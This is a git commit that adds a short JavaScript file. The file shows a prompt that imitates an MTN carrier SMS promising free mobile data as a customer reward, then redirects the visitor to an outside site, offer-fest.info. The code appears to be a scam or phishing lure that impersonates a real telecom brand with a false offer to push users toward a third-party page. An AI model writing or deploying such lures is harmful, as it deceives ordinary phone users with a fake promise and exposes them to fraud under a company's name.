39664b983f3828edf5b9ee48e413fabdb7ac785d
ekpesense <abantak9@gmail.com>
2025-02-16 03:49:10 -0800

    Create activation-free-swmtn-data.js

---
+++ activation-free-swmtn-data.js
@@ -0,0 +1,6 @@
+
+var password = 'FREE DATA'
+password=prompt('MTN SMS: Dear customer, kindly check if your MTN sim card is qualify to receive from 5GB to Unlimited data, old customers Reward, press FREE DATA to check now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://offer-fest.info/free-swmtn-data.html';
+}
